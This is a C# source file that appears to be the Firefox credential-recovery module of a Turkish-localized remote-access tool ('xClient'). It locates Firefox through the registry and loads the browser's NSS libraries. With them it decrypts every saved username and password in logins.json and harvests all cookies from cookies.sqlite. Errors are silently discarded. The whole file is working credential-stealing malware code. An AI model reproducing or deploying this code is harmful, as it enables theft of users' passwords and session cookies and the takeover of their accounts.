using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Eklentiler;
using xClient.KuuhakuÇekirdek.Kurtarma.Utilities;
using xClient.KuuhakuÇekirdek.Utilityler;
using xClient.KuuhakuÇekirdek.Yardımcılar;

namespace xClient.KuuhakuÇekirdek.Kurtarma.Tarayıcılar
{
    public static class Firefox
    {
        private static IntPtr nssModule;
        private static DirectoryInfo firefoxPath;
        private static readonly DirectoryInfo firefoxProfilePath;
        private static readonly FileInfo firefoxLoginFile;
        private static readonly FileInfo firefoxCookieFile;

        static Firefox()
        {
            try
            {
                firefoxPath = GetFirefoxInstallPath();
                if (firefoxPath == null)
                    throw new NullReferenceException("Firefox yüklü değil veya bulunamadı.");

                firefoxProfilePath = GetProfilePath();
                if (firefoxProfilePath == null)
                    throw new NullReferenceException("Firefox hiçbir profile sahip değil daha önce açtığına emin misin?");

                firefoxLoginFile = GetFile(firefoxProfilePath, "logins.json");
                if (firefoxLoginFile == null)
                    throw new NullReferenceException("Firefox hiçbir logins.json dosyasına sahip değil.");

                firefoxCookieFile = GetFile(firefoxProfilePath, "cookies.sqlite");
                if (firefoxCookieFile == null)
                    throw new NullReferenceException("Firefox hiçbir çereze sahip değil.");
            }
            catch (Exception)
            {
            }
        }

        #region Public Members

        public static List<KurtarılanHesaplar> GetSavedPasswords()
        {
            List<KurtarılanHesaplar> firefoxPasswords = new List<KurtarılanHesaplar>();
            try
            {
                InitializeDelegates(firefoxProfilePath, firefoxPath);

                JsonFFData ffLoginData = new JsonFFData();

                using (StreamReader sr = new StreamReader(firefoxLoginFile.FullName))
                {
                    string json = sr.ReadToEnd();
                    ffLoginData = JsonUtil.Deserialize<JsonFFData>(json);
                }

                foreach (var data in ffLoginData.logins)
                {
                    string username = Decrypt(data.encryptedUsername);
                    string password = Decrypt(data.encryptedPassword);
                    Uri host = new Uri(data.formSubmitURL);

                    firefoxPasswords.Add(new KurtarılanHesaplar
                    {
                        Url = host.AbsoluteUri,
                        Username = username,
                        Password = password,
                        Application = "Firefox"
                    });
                }
            }
            catch (Exception)
            {
            }
            return firefoxPasswords;
        }

        public static List<FirefoxCookie> GetSavedCookies()
        {
            var data = new List<FirefoxCookie>();
            var sql = new SQLiteHandler(firefoxCookieFile.FullName);
            if (!sql.ReadTable("moz_cookies"))
                throw new Exception("Çerez tablosu okunamadı.");

            int totalEntries = sql.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    string h = sql.GetValue(i, "host");
                    string name = sql.GetValue(i, "name");
                    string val = sql.GetValue(i, "value");
                    string path = sql.GetValue(i, "path");

                    bool secure = sql.GetValue(i, "isSecure") == "0" ? false : true;
                    bool http = sql.GetValue(i, "isSecure") == "0" ? false : true;

                    // bu çalışmazsa sıçtım
                    var expiryTime = long.Parse(sql.GetValue(i, "expiry"));
                    var currentTime = ToUnixTime(DateTime.Now);
                    var exp = FromUnixTime(expiryTime);
                    var expired = currentTime > expiryTime;

                    data.Add(new FirefoxCookie
                    {
                        Host = h,
                        ExpiresUTC = exp,
                        Expired = expired,
                        Name = name,
                        Value = val,
                        Path = path,
                        Secure = secure,
                        HttpOnly = http
                    });
                }
                catch (Exception)
                {
                    return data;
                }
            }
            return data;
        }

        #endregion

        #region Functions

        private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
        {
            if (new Version(FileVersionInfo.GetVersionInfo(firefoxPath.FullName + "\\firefox.exe").FileVersion).Major <
                new Version("35.0.0").Major)
                return;

            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
            NativeMethods.LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
            nssModule = NativeMethods.LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "NSS_Init");
            NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
            NSS_Init(firefoxProfilePath.FullName);
            long keySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(keySlot, true, 0);
        }

        private static DateTime FromUnixTime(long unixTime)
        {
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddSeconds(unixTime);
        }

        private static long ToUnixTime(DateTime value)
        {
            TimeSpan span = (value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime());
            return (long) span.TotalSeconds;
        }

        #endregion

        #region File Handling

        private static DirectoryInfo GetProfilePath()
        {
            string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                      @"\Mozilla\Firefox\Profiles";
            if (!Directory.Exists(raw))
                throw new Exception("Firefox Uygulama Verileri Klasörü Bulunamadı.");
            DirectoryInfo profileDir = new DirectoryInfo(raw);

            DirectoryInfo[] profiles = profileDir.GetDirectories();
            if (profiles.Length == 0)
                throw new IndexOutOfRangeException("Hiçbir Firefox profili tespit edilemedi.");

            return profiles[0];
        }

        private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
        {
            foreach (FileInfo file in profilePath.GetFiles(searchTerm))
            {
                return file;
            }
            throw new Exception("Firefox logins.json dosyasına sahip değil.");
        }

        private static DirectoryInfo GetFirefoxInstallPath()
        {
            using (RegistryKey key = PlatformYardımcısı.A64Bitmi
                ? RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
                    @"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox")
                : RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
                    @"SOFTWARE\Mozilla\Mozilla Firefox"))
            {
                if (key == null) return null;

                string[] installedVersions = key.GetSubKeyNames();

                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                using (RegistryKey mainInstall = key.OpenSubKey(installedVersions[0]))
                {
                    // get install directory
                    string installPath = mainInstall.OpenReadonlySubKeySafe("Ana")
                        .GetValueSafe("Kurulum Dizini");

                    if (string.IsNullOrEmpty(installPath))
                        throw new NullReferenceException("Yükleme dizini boş veya 0 olamaz.");

                    firefoxPath = new DirectoryInfo(installPath);
                }
            }
            return firefoxPath;
        }

        #endregion

        #region WinApi

        private static IntPtr LoadWin32Library(string libPath)
        {
            if (string.IsNullOrEmpty(libPath))
                throw new ArgumentNullException("libPath");

            IntPtr moduleHandle = NativeMethods.LoadLibrary(libPath);
            if (moduleHandle == IntPtr.Zero)
            {
                var lasterror = Marshal.GetLastWin32Error();
                var innerEx = new Win32Exception(lasterror);
                innerEx.Data.Add("LastWin32Error", lasterror);

                throw new Exception("DLL yüklenemedi " + libPath, innerEx);
            }
            return moduleHandle;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSSBase64_DecodeBufferPtr(
            IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [StructLayout(LayoutKind.Sequential)]
        private struct TSECItem
        {
            public readonly int SECItemType;
            public readonly int SECItemData;
            public readonly int SECItemLen;
        }

        #endregion

        #region JSON

        /* private class JsonFFData
        {

            public long nextId;
            public LoginData[] logins;
            public string[] disabledHosts;
            public int version;

        }
        private class LoginData
        {

            public long id;
            public string hostname;
            public string url;
            public string httprealm;
            public string formSubmitURL;
            public string usernameField;
            public string passwordField;
            public string encryptedUsername;
            public string encryptedPassword;
            public string guid;
            public int encType;
            public long timeCreated;
            public long timeLastUsed;
            public long timePasswordChanged;
            public long timesUsed;

        }*/

        public class Login
        {
            public int id { get; set; }
            public string hostname { get; set; }
            public object httpRealm { get; set; }
            public string formSubmitURL { get; set; }
            public string usernameField { get; set; }
            public string passwordField { get; set; }
            public string encryptedUsername { get; set; }
            public string encryptedPassword { get; set; }
            public string guid { get; set; }
            public int encType { get; set; }
            public long timeCreated { get; set; }
            public long timeLastUsed { get; set; }
            public long timePasswordChanged { get; set; }
            public int timesUsed { get; set; }
        }

        public class JsonFFData
        {
            public int nextId { get; set; }
            public List<Login> logins { get; set; }
            public List<object> disabledHosts { get; set; }
            public int version { get; set; }
        }

        #endregion

        #region Delegate Handling

        // Şura işe yarıyo http://www.codeforge.com/article/249225
        private static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
            PK11_GetInternalKeySlotPtr ptr =
                (PK11_GetInternalKeySlotPtr)
                    Marshal.GetDelegateForFunctionPointer(pProc, typeof (PK11_GetInternalKeySlotPtr));
            return ptr();
        }

        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11_Authenticate");
            PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
            return ptr(slot, loadCerts, wincx);
        }

        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
            NSSBase64_DecodeBufferPtr ptr =
                (NSSBase64_DecodeBufferPtr)
                    Marshal.GetDelegateForFunctionPointer(pProc, typeof (NSSBase64_DecodeBufferPtr));
            return ptr(arenaOpt, outItemOpt, inStr, inLen);
        }

        private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(nssModule, "PK11SDR_Decrypt");
            PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
            return ptr(ref data, ref result, cx);
        }

        private static string Decrypt(string cypherText)
        {
            StringBuilder sb = new StringBuilder(cypherText);
            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
            TSECItem tSecDec = new TSECItem();
            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    var bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }
            return null;
        }

        #endregion
    }

    public class FirefoxPassword
    {
        public string Username { get; set; }
        public string Password { get; set; }
        public Uri Host { get; set; }

        public override string ToString()
        {
            return string.Format("Kullanıcı Adı: {0}{3}Şifre: {1}{3}Host: {2}", Username, Password, Host.Host,
                Environment.NewLine);
        }
    }

    public class FirefoxCookie
    {
        public string Host { get; set; }
        public string Name { get; set; }
        public string Value { get; set; }
        public string Path { get; set; }
        public DateTime ExpiresUTC { get; set; }
        public bool Secure { get; set; }
        public bool HttpOnly { get; set; }
        public bool Expired { get; set; }

        public override string ToString()
        {
            return
                string.Format(
                    "Domain: {1}{0}Cookie Adı: {2}{0}Değer: {3}{0}Yol: {4}{0}SüresiGeçti: {5}{0}HttpOnly: {6}{0}Güvenlimi: {7}",
                    Environment.NewLine, Host, Name, Value, Path, Expired, HttpOnly, Secure);
        }
    }
}